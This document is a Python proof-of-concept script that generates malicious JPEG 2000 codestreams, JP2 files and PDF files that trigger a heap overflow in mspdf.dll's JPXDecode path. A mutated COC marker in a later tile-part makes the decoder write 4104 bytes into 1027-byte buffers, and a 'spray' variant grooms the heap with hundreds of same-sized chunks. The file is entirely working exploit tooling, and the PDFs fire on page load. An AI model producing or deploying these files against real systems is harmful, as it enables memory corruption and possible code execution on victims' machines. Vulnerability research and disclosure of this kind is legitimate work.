#!/usr/bin/env python3
"""
PoC generator for FINDING-006 (mspdf.dll, JPEG 2000 / JPXDecode).

Bug: a COC marker in a *later* tile-part header replaces a tile-component's
coding style, including the code-block size exponents xcb (+0x30) and ycb
(+0x34).  The EBCOT bit-plane state buffers are allocated once, for TPsot == 0
only, from those exponents; the decode path re-reads the mutated exponents and
writes into the old buffers with the new dimensions.

Emits raw codestreams (.j2k), JP2-boxed versions (.jp2) and PDF wrappers that
reach the decoder through /Filter /JPXDecode on a page's image XObject.

Every field is chosen to satisfy the constraints read out of the mspdf marker
parser (FUN_18091503D) *and* to be legal per ISO/IEC 15444-1, so these are
conforming codestreams, not malformed ones:

  COD : xcb_raw=8, ycb_raw=0 -> xcb=10, ycb=2  (1024 x 4 code-block, 10+2=12 <= 12)
  COC : xcb_raw=0, ycb_raw=2 -> xcb= 2, ycb=4  (   4 x 16 code-block,  2+4= 6 <= 12)
        placed in the tile-part-1 header, keeping L unchanged so the one
        downstream consistency check (which only compares L) still passes.

With L=0 the LL band is the whole tile, so a tile 1024 samples wide holds
code-blocks whose *actual* width is the full nominal 1024:

  alloc  (tile-part 0, 1<<ycb = 4  < 9) : 1 * (1024 + 3) = 1027 bytes
  write  (tile-part 1, 9 <= 1<<ycb = 16 < 33) : (1024 + 2) * 4 = 4104 bytes
  -> 3077 bytes past the end of five separate 1027-byte heap buffers.

Usage: gen_finding006.py <output-directory>
"""
import os
import struct
import sys

SOC, SIZ, COD, COC, QCD = (b'\xff\x4f', b'\xff\x51', b'\xff\x52',
                           b'\xff\x53', b'\xff\x5c')
SOT, SOD, EOC = b'\xff\x90', b'\xff\x93', b'\xff\xd9'

u8 = lambda v: struct.pack('>B', v)
u16 = lambda v: struct.pack('>H', v)
u32 = lambda v: struct.pack('>I', v)


def seg(marker, body):
    """Marker segment; the Lxxx field counts itself but not the marker."""
    return marker + u16(len(body) + 2) + body


def siz(w, h, tw, th, depth=8, ncomp=1):
    body = (u16(0) + u32(w) + u32(h) + u32(0) + u32(0)
            + u32(tw) + u32(th) + u32(0) + u32(0) + u16(ncomp))
    return seg(SIZ, body + (u8(depth - 1) + u8(1) + u8(1)) * ncomp)


def cod(levels, xcb_raw, ycb_raw, layers, prog=0, cbstyle=0, transform=1):
    body = (u8(0)                                  # Scod: default precincts
            + u8(prog) + u16(layers) + u8(0)       # SGcod, MCT off
            + u8(levels) + u8(xcb_raw) + u8(ycb_raw) + u8(cbstyle) + u8(transform))
    return seg(COD, body)


def coc(comp, levels, xcb_raw, ycb_raw, cbstyle=0, transform=1):
    body = (u8(comp) + u8(0)                       # Ccoc (1 byte, Csiz < 257), Scoc
            + u8(levels) + u8(xcb_raw) + u8(ycb_raw) + u8(cbstyle) + u8(transform))
    return seg(COC, body)                          # Lcoc = 9, inside the parser's [9,43]


def qcd(levels, guard=2, exponent=8):
    # Sqcd & 0x1f == 0 -> no quantization, one SPqcd byte per 3L+1 band.
    return seg(QCD, u8(guard << 5) + u8(exponent << 3) * (3 * levels + 1))


def sot(isot, psot, tpsot, tnsot):
    return seg(SOT, u16(isot) + u32(psot) + u8(tpsot) + u8(tnsot))


# ----------------------------------------------------- packet header bit I/O

class Bits:
    """MSB-first packet-header writer with JPEG 2000 bit stuffing."""

    def __init__(self):
        self.out = bytearray()
        self.cur = 0
        self.n = 0
        self.cap = 8

    def put(self, bit):
        self.cur = (self.cur << 1) | (bit & 1)
        self.n += 1
        if self.n == self.cap:
            self.out.append(self.cur)
            self.cap = 7 if self.cur == 0xff else 8   # stuff a 0 after a 0xFF
            self.cur = 0
            self.n = 0

    def puts(self, s):
        for c in s:
            self.put(int(c))

    def flush(self):
        while self.n:
            self.put(0)
        if self.out and self.out[-1] == 0xff:
            self.out.append(0x00)      # a header may not end on 0xFF
        return bytes(self.out)


class TagTree:
    """ISO/IEC 15444-1 Annex B.10.2 tag tree, encoder side."""

    class Node(object):
        __slots__ = ('value', 'low', 'known', 'parent')

        def __init__(self):
            self.value = 999
            self.low = 0
            self.known = False
            self.parent = None

    def __init__(self, w, h):
        self.levels = []
        cw, ch = w, h
        while True:
            self.levels.append([[TagTree.Node() for _ in range(cw)] for _ in range(ch)])
            if cw == 1 and ch == 1:
                break
            cw, ch = (cw + 1) // 2, (ch + 1) // 2
        for i in range(len(self.levels) - 1):
            lvl, par = self.levels[i], self.levels[i + 1]
            for y, row in enumerate(lvl):
                for x, node in enumerate(row):
                    node.parent = par[y // 2][x // 2]

    def leaf(self, x, y):
        return self.levels[0][y][x]

    def setvalue(self, x, y, value):
        n = self.leaf(x, y)
        while n is not None and n.value > value:
            n.value = value
            n = n.parent

    def encode(self, bits, x, y, threshold):
        n = self.leaf(x, y)
        stack = []
        while n.parent is not None:
            stack.append(n)
            n = n.parent
        low = 0
        while True:
            if low > n.low:
                n.low = low
            else:
                low = n.low
            while low < threshold:
                if low >= n.value:
                    if not n.known:
                        bits.put(1)
                        n.known = True
                    break
                bits.put(0)
                low += 1
            n.low = low
            if not stack:
                break
            n = stack.pop()

    def known(self, x, y):
        return self.leaf(x, y).known


class Precinct:
    """Emits successive layers' packets for one precinct of nw x nh code-blocks.

    Every code-block is included in every layer with one coding pass and
    `seglen` bytes of body, which is all the decode driver needs: it reaches the
    overflowing memset/memcpy before any MQ decoding happens.
    """

    def __init__(self, nw, nh, seglen=4):
        self.nw, self.nh, self.seglen = nw, nh, seglen
        self.incl = TagTree(nw, nh)
        self.imsb = TagTree(nw, nh)
        self.seen = set()

    def packet(self, layer):
        b = Bits()
        b.put(1)                                   # non-empty packet
        for y in range(self.nh):
            for x in range(self.nw):
                if (x, y) not in self.seen:
                    self.incl.setvalue(x, y, layer)
                    self.incl.encode(b, x, y, layer + 1)
                    self.imsb.setvalue(x, y, 0)    # 0 missing MSBs
                    t = 1
                    while not self.imsb.known(x, y):
                        self.imsb.encode(b, x, y, t)
                        t += 1
                    self.seen.add((x, y))
                else:
                    b.put(1)                       # included again in this layer
                b.put(0)                           # number of coding passes = 1
                b.put(0)                           # Lblock unchanged (stays 3)
                nbits = 3                          # Lblock + floor(log2(1))
                assert self.seglen < (1 << nbits)
                b.puts(format(self.seglen, '0%db' % nbits))
        body = bytes([0xa5, 0x5a, 0xa5, 0x5a][:self.seglen]) * (self.nw * self.nh)
        return b.flush() + body


# ------------------------------------------------------------- codestreams

LEVELS = 0
XCB0, YCB0 = 8, 0        # main header: xcb=10, ycb=2 -> nominal code-block 1024 x 4
XCB1, YCB1 = 0, 2        # tile-part-1 COC: xcb=2, ycb=4 -> nominal code-block 4 x 16
CBW, CBH = 1 << (XCB0 + 2), 1 << (YCB0 + 2)


def tile_part(tpsot, tnsot, header_segs=b'', body=b''):
    inner = header_segs + SOD + body
    return sot(0, 2 + 10 + len(inner), tpsot, tnsot) + inner


def build(width, height, tp1_coc=True, tp1_empty_packet=False):
    """One tile, one component, two tile-parts, two layers."""
    nw = -(-width // CBW)                  # code-blocks across the LL band
    nh = -(-height // CBH)                 # ... and down
    prc = Precinct(nw, nh)
    pkt0 = prc.packet(0)
    pkt1 = b'\x00' if tp1_empty_packet else prc.packet(1)
    return (SOC
            + siz(width, height, width, height)
            + cod(LEVELS, XCB0, YCB0, layers=2)
            + qcd(LEVELS)
            + tile_part(0, 2, body=pkt0)
            + tile_part(1, 2,
                        header_segs=coc(0, LEVELS, XCB1, YCB1) if tp1_coc else b'',
                        body=pkt1)
            + EOC)


# ------------------------------------------------------------- containers

def box(kind, payload):
    return u32(len(payload) + 8) + kind + payload


def jp2(codestream, w, h, ncomp=1, depth=8):
    ihdr = box(b'ihdr', u32(h) + u32(w) + u16(ncomp) + u8(depth - 1)
               + u8(7) + u8(0) + u8(0))
    colr = box(b'colr', u8(1) + u8(0) + u8(0) + u32(17))    # enumCS 17 = greyscale
    return (box(b'jP  ', b'\x0d\x0a\x87\x0a')
            + box(b'ftyp', b'jp2 ' + u32(0) + b'jp2 ')
            + box(b'jp2h', ihdr + colr)
            + box(b'jp2c', codestream))


def pdf(codestream, w, h):
    """Smallest PDF that makes the renderer decode `codestream` on page load."""
    content = b'q %d 0 0 %d 0 0 cm /Im0 Do Q\n' % (w, h)
    objs = [
        b'<< /Type /Catalog /Pages 2 0 R >>',
        b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
        b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 %d %d] '
        b'/Resources << /XObject << /Im0 5 0 R >> >> /Contents 4 0 R >>' % (w, h),
        b'<< /Length %d >>\nstream\n' % len(content) + content + b'endstream',
        b'<< /Type /XObject /Subtype /Image /Width %d /Height %d '
        b'/ColorSpace /DeviceGray /BitsPerComponent 8 '
        b'/Filter /JPXDecode /Length %d >>\nstream\n' % (w, h, len(codestream))
        + codestream + b'\nendstream',
    ]
    out = bytearray(b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n')
    offsets = []
    for i, o in enumerate(objs, 1):
        offsets.append(len(out))
        out += b'%d 0 obj\n' % i + o + b'\nendobj\n'
    xref = len(out)
    out += b'xref\n0 %d\n0000000000 65535 f \n' % (len(objs) + 1)
    for off in offsets:
        out += b'%010d 00000 n \n' % off
    out += (b'trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n'
            % (len(objs) + 1, xref))
    return bytes(out)


# ------------------------------------------------------------------- main

VARIANTS = [
    ('poc_min', 4, 4, dict(),
     'minimal: a 4x4 image.  FUN_1808F9500 takes its length from the NOMINAL '
     'width recorded in the holder, so the holder-A copy is (1024+2)*4 whatever '
     'the image size -- 4104 bytes into 1027, reading 4104 from another 1027'),
    ('poc', 1024, 4, dict(),
     'primary: the band is 1024 wide, so the ACTUAL code-block width is 1024 '
     'too and holder B\'s memset overflows by the same 3077 bytes as holder '
     'A\'s copy -- both buffers, one file'),
    ('poc_tp1empty', 1024, 4, dict(tp1_empty_packet=True),
     'hedge: tile-part 1 packet is zero-length, which parses identically under '
     'either code-block geometry, so the overflow rests only on the mutated '
     'coding style being live at decode time'),
    ('poc_spray', 1024, 1024, dict(),
     'spray: 256 code-blocks, so 3*256+2 = 770 identically sized 1027-byte pool '
     'chunks are allocated and each is written 4104 bytes'),
    ('control_min', 4, 4, dict(tp1_coc=False),
     'control for the minimal variant'),
    ('control', 1024, 4, dict(tp1_coc=False),
     'control: identical but for the absent tile-part-1 COC'),
    ('control_spray', 1024, 1024, dict(tp1_coc=False),
     'control for the spray variant'),
]


def main():
    if len(sys.argv) != 2:
        sys.exit('usage: gen_finding006.py <output-directory>')
    out = sys.argv[1]
    os.makedirs(out, exist_ok=True)

    print('%-15s %9s %6s %7s %7s %7s  %s'
          % ('variant', 'image', 'cblks', 'j2k', 'jp2', 'pdf', 'what it is'))
    for name, w, h, kw, what in VARIANTS:
        cs = build(w, h, **kw)
        files = {'%s.j2k' % name: cs,
                 '%s.jp2' % name: jp2(cs, w, h),
                 '%s.pdf' % name: pdf(cs, w, h)}
        for fn, data in files.items():
            with open(os.path.join(out, fn), 'wb') as fh:
                fh.write(data)
        print('%-15s %9s %6d %7d %7d %7d  %s'
              % (name, '%dx%d' % (w, h), -(-w // CBW) * -(-h // CBH),
                 len(cs), len(files['%s.jp2' % name]), len(files['%s.pdf' % name]),
                 what))

    alloc = 1 * (CBW + 3)
    write = (CBW + 2) * 4
    print('\ntile-part 0  xcb=%d ycb=%d -> nominal code-block %d x %d'
          % (XCB0 + 2, YCB0 + 2, CBW, CBH))
    print('tile-part 1  xcb=%d ycb=%d -> nominal code-block %d x %d'
          % (XCB1 + 2, YCB1 + 2, 1 << (XCB1 + 2), 1 << (YCB1 + 2)))
    print('alloc  FUN_180886cff(W=%d, H=%d, words=1) = 1 * (%d + 3) = %d bytes'
          % (CBW, CBH, CBW, alloc))
    print('write  (W_actual + 2) * 4                 = (%d + 2) * 4 = %d bytes'
          % (CBW, write))
    print('overflow per buffer                       = %d bytes' % (write - alloc))


if __name__ == '__main__':
    main()
